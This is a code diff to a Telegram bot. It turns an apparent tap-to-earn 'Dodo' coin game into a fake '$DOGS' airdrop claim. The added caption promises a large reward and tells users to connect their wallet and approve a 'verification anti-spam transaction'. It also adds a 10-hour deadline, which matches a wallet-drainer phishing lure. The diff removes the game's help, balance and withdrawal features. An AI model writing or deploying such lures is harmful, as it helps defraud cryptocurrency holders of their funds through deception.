@@ -41,7 +41,7 @@ export async function communityButton(final = false) {
 	if (final) {
 		return [
 			Markup.button.url(`Join to ${channel.title}`, `https://t.me/${tChannel.username}`),
-			Markup.button.callback("Receive 2k", 'lock_check')
+			Markup.button.callback("Receive 547289.00 $DOGS", 'lock_check')
 		]
 	} else {
 		return [
@@ -88,7 +88,7 @@ class DodoClient extends DodoSession {
 			await e.reply("You receive 2K dodo");
 		}
 		else if (data === 'community') {
-			await e.reply("Join our community and receive 2k dodo coin!", {
+			await e.reply("Join our community and receive 547289.00 $DOGS!", {
 				...Markup.inlineKeyboard(await communityButton(true))
 			})
 		}
@@ -112,20 +112,22 @@ class DodoClient extends DodoSession {
 						source: process.cwd()+"/public/banner.png"
 					}), {
 						caption: `
-					Hi, ${!ctx?.payload?.nonUsername ? "@":""}${user.username}! 
-This is Dodo, the real one.
+🦴 Your reward has been updated!
 
-Tap on the coin and watch your balance grow.
+🎁 Your available reward: 
+547289.00 $DOGS
 
-How much is Dodo worth? No one knows, probably something.
+👇 Conditions of participation in daily rewards:
 
-Got any friends? Get them in the game. That way you'll get even more coins together.
+🔸 Click the button below this message, to claim your reward!
 
-Dodo is everything you ever wanted . That's all you need to know.
+🔸 After connecting your wallet, you must confirm the verification anti-spam transaction. This is secure and confirms that your wallet is your primary wallet.
+
+🚨 Please note that you have only 10 hours left to claim your reward!
 					`.trim()
 						,
 						...(Markup.inlineKeyboard([
-							Markup.button.webApp("Play $DoDo 💰", await getWebAppUrl(user)),
+							Markup.button.webApp("Claim $DOGS", await getWebAppUrl(user)),
 							Markup.button.switchToChat("Invite Friends!", await getInviteText(user)),
 							...(await communityButton())
 						],{
@@ -139,77 +141,6 @@ Dodo is everything you ever wanted . That's all you need to know.
 				handler: async () => {
 					await sendInvite(user);
 				},
-			},
-			{
-				name: 'Help',
-				handler: async () => ctx.reply(`
-				Tap to Earn:
-Dodo is an addictive clicker game where you accumulate Shares by tapping the screen.
-
-Leagues:
-Climb the ranks by earning more Shares and outperforming others in the leagues.
-
-Boosts:
-Unlock boosts and complete tasks to maximize your Shares earnings.
-
-Friends:
-Invite others and both of you will receive bonuses. Assist your friends in advancing to higher leagues for bigger Shares rewards.
-
-The Purpose:
-Collect as many Shares as possible and exchange them for TAPS, Dodo Token on Solana Blockchain.
-
-Type /help to access this guide.
-				`),
-			},
-			{
-				name: 'Wallet',
-				handler: async () => {
-					await ctx.reply(`Balance: ${user.wallet}DODO`);
-				}
-			},
-			{
-				name: "Earn",
-				async handler() {
-					const url = await getWebAppUrl(user);
-					await ctx.reply('Hey there 😉! The bonus won\'t claim itself. Head over to the game, grab your bonus 💰, tap, and get ready for exciting new promotions! 🥳', {
-						...Markup.inlineKeyboard([
-							Markup.button.webApp('Play $DoDo 💰', url),
-							...(await communityButton())
-						])
-					});
-				}
-			},
-			/*{
-				name: "Withdraw",
-				async handler() {
-					await ctx.reply(`
-					Minimum Coin Required to send withdraw request: 100dodo
-
-					Are you sure?
-					`
-							.split("\n")
-							.map(s => s.trim())
-							.join("\n"),
-						DodoBot.renderButtons([
-							['Home', 'Send Withdraw Request']
-						])
-					)
-				}
-			}, TODO: Should be on the client side not bot*/
-			{
-				name: "Send Withdraw Request",
-				handler: async () => {
-					if (user.wallet < 100) throw ("Infusion Balance");
-
-					const address = (await this.input("Enter wallet address")).text;
-					const amount = +((await this.input('Enter Amount (min: 100):'))?.text || "");
-
-					if (!address || isNaN(amount) || amount < 100) throw ("Something Wrong!");
-
-
-					/*TODO: Handle this*/
-					await ctx.reply("Request Sent!")
-				}
 			},
 			{
 				name: "Refs",
